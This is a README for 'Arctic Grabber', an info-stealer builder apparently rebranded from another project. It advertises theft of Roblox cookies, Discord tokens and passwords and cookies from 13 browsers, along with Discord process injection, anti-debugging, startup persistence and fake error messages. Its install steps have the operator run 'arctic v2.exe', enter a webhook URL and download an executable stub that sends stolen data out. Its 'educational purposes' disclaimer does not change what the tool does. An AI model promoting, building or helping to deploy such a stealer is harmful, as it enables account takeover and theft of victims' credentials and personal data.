Now its working 5/30/23 | if still have error let me know.

<img src="img/banner.png" width="100%" height="100%" />

<div align="center">
    <img src="https://img.shields.io/github/languages/top/addi00000/empyrean?color=%23000000">
    <img src="https://img.shields.io/github/stars/addi00000/empyrean?color=%23000000&logoColor=%23000000">
    <br>
    <img src="https://img.shields.io/github/commit-activity/w/addi00000/empyrean?color=%23000000"> 
    <img src="https://img.shields.io/github/last-commit/addi00000/empyrean?color=%23000000&logoColor=%23000000">
    <br>
    <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
    <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
</div>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

## Features
- [Roblox cookie](img/em1.png)
- [Discord token info](img/em1.png)
- [Browser stealing](img/em0.png) from 13 browsers (passwords, cookies, history, bookmarks, etc.)
- [Discord process injection](img/em3.png) 
- [Detailed system info](img/em2.png)
- Anti Debugging
- Startup persistence
- Fake error messages
- Custom icon



## Install
<br>
<details>
    <summary>Prerequisites</summary>
    <ul>
        <li><a href="https://www.python.org/downloads/windows/"><p>Python</p></a></li>
        <li><a href="https://git-scm.com/download/win"><p>Git</p></a></li>
    <ul>
</details>
<br>
<details>
    <summary>how to install</summary>
    <ol>
        <li><code>Make sure to install first the latest Python</code></li>
        <li>Run arctic v2.exe
        <li>Insert your webhook url
            <li> Insert image url link
                <li> Wait for executable stub to downloaded
        
    
</details>
<br>


![image](https://user-images.githubusercontent.com/116596775/197620465-a5fe59a4-88fc-4aae-8a84-9d656472ed7b.png)




<div align="center">
   
    
   
</div>



## Contributing

View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.



## License

 is licensed under the <a href="https://mit-license.org/">MIT License</a>.



## Errors?
- Make an [issue](https://github.com/adddi0000/Arctic-Grabber/issues)
- Join the [Discord](https://discord.gg/C2xM9Ej3wr)

<img src="img/footer.png">

This is for Educational purposes!!
